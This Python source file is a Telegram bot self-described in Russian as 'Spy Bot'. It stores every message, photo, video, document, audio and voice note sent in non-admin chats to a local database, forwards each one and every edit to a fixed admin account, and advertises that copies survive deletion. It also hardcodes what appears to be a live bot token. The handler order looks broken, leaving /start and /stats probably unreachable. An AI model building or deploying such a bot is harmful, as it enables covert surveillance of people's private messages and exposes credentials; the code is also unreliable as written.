import telebot
from telebot import types
import sqlite3
import time
from datetime import datetime

BOT_TOKEN = "8691007369:AAEpugKsGg_eBPbchs8MCxc_jGoE2asX6ak"
ADMIN_ID = 7481288398

bot = telebot.TeleBot(BOT_TOKEN)

conn = sqlite3.connect('spy_data.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''
    CREATE TABLE IF NOT EXISTS messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        text TEXT,
        file_id TEXT,
        file_type TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
''')
conn.commit()

@bot.message_handler(content_types=['text', 'photo', 'video', 'document', 'audio', 'voice'])
def forward_to_admin(message):
    if message.chat.id != ADMIN_ID:
        user_id = message.from_user.id
        username = message.from_user.username or "unknown"
        text = message.text or ""
        
        file_id = None
        file_type = None
        if message.photo:
            file_id = message.photo[-1].file_id
            file_type = "photo"
        elif message.video:
            file_id = message.video.file_id
            file_type = "video"
        elif message.document:
            file_id = message.document.file_id
            file_type = "document"
        elif message.audio:
            file_id = message.audio.file_id
            file_type = "audio"
        elif message.voice:
            file_id = message.voice.file_id
            file_type = "voice"
        
        cursor.execute('''
            INSERT INTO messages (user_id, username, text, file_id, file_type)
            VALUES (?, ?, ?, ?, ?)
        ''', (user_id, username, text, file_id, file_type))
        conn.commit()
        
        if message.photo:
            bot.send_photo(ADMIN_ID, message.photo[-1].file_id, caption=f"📸 Фото от {username}")
        elif message.video:
            bot.send_video(ADMIN_ID, message.video.file_id, caption=f"🎬 Видео от {username}")
        elif message.document:
            bot.send_document(ADMIN_ID, message.document.file_id, caption=f"📄 Документ от {username}")
        elif message.audio:
            bot.send_audio(ADMIN_ID, message.audio.file_id, caption=f"🎵 Аудио от {username}")
        elif message.voice:
            bot.send_voice(ADMIN_ID, message.voice.file_id, caption=f"🎤 Голосовое от {username}")
        else:
            bot.send_message(ADMIN_ID, f"📩 **{username}** (@{username}):\n\n{text}", parse_mode="Markdown")

@bot.edited_message_handler()
def handle_edit(message):
    if message.chat.id != ADMIN_ID:
        username = message.from_user.username or "unknown"
        new_text = message.text or ""
        bot.send_message(
            ADMIN_ID,
            f"✏️ **{username}** (@{username}) изменил(а) сообщение:\n\nNew:\n{new_text}",
            parse_mode="Markdown"
        )

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(
        message.chat.id,
        "🕵️ **Spy Bot активирован!**\n\n"
        "✅ Я пересылаю все сообщения в личку.\n"
        "✅ Сохраняю фото, видео, документы, аудио, голосовые.\n"
        "✅ Даже если удалят — копия останется у тебя.\n\n"
        "📊 /stats — статистика",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['stats'])
def stats(message):
    cursor.execute('SELECT COUNT(*) FROM messages')
    total = cursor.fetchone()[0]
    bot.send_message(message.chat.id, f"📊 Сохранено сообщений: {total}")

if __name__ == "__main__":
    print("🕵️ SPY BOT ЗАПУЩЕН!")
    bot.polling(non_stop=True)
